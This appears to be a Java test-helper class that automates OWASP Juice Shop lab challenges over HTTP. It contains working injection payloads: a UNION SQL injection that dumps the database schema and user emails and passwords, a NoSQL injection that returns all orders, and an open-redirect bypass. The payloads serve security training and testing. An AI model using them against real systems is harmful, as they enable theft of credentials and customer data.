package utilities.JuiceShop;

import org.openqa.selenium.json.Json;
import java.io.IOException;
import java.net.http.HttpResponse;
import java.util.ArrayList;
import java.util.List;
import static java.net.HttpURLConnection.HTTP_OK;

/**
 * Groups resource and information-related operations used by the Juice Shop lab tests.
 */
public final class ResourceActions extends ActionContext {
    /**
     * Uses the shared per-test HTTP client and JSON JSON converter.
     *
     * @param api configured application client
     * @param json shared JSON JSON converter
     */
    ResourceActions(JuiceShopApi api, Json json) { super(api, json); }

    /**
     * Collects the resource observation for the Nested Easter Egg lab challenge.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveNestedEasterEgg() throws IOException, InterruptedException {
        return api.get("/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg");
    }

    /**
     * Collects the resource observation for the Retrieve Blueprint lab challenge.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveBlueprint() throws IOException, InterruptedException {
        return api.get("/assets/public/images/products/JuiceShop.stl");
    }

    /**
     * Collects the access-control observation for the premium-page lab challenge.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> openPremiumPage() throws IOException, InterruptedException {
        return api.get("/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us");
    }

    /**
     * Collects the observation for the Imaginary lab challenge.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> applyImaginaryContinueCode() throws IOException, InterruptedException {
        return api.sendApi("PUT", "/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj", null, null);
    }

    /**
     * Collects the redirect-policy observation used by the related lab challenge.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> bypassRedirectAllowlist() throws IOException, InterruptedException {
        return api.get("/redirect?to=http://kimminich.de?pwned=https://github.com/juice-shop/juice-shop");
    }

    /**
     * Collects the information-exposure observation for the Database Schema lab challenge.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveDatabaseSchema() throws IOException, InterruptedException {
        return searchWithUnion("sqlite_master", "sql", "'2'", "'3'");
    }

    /**
     * Returns the HTTP observation used by the lab's database-related challenge checks.
     *
     * @param table the database table included in the lab-only UNION query
     * @param first the expression selected as the first result column
     * @param second the expression selected as the second result column
     * @param third the expression selected as the third result column
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    private HttpResponse<String> searchWithUnion(String table, String first, String second, String third)
            throws IOException, InterruptedException {
        List<String> columns = new ArrayList<>(List.of(first, second, third));
        for (int i = 4; i <= 10; i++) columns.add("'" + i + "'");

        String query = "qwert')) UNION SELECT " + String.join(",", columns) + " FROM " + table + "--";
        var response = api.get("/rest/products/search?q=" + encode(query));

        if (response.statusCode() != HTTP_OK)
            throw new IllegalStateException("Union query failed: HTTP " + response.statusCode() + " " + response.body());

        return response;
    }

    /**
     * Collects the information-exposure observation for the User Credentials lab challenge.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveUserCredentials() throws IOException, InterruptedException {
        return searchWithUnion("Users", "id", "email", "password");
    }

    /**
     * Collects the order-data protection observation for the related lab challenge.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> exfiltrateOrdersViaNoSql() throws IOException, InterruptedException {
        return api.get("/rest/track-order/" + encode("' || true || '"));
    }
}
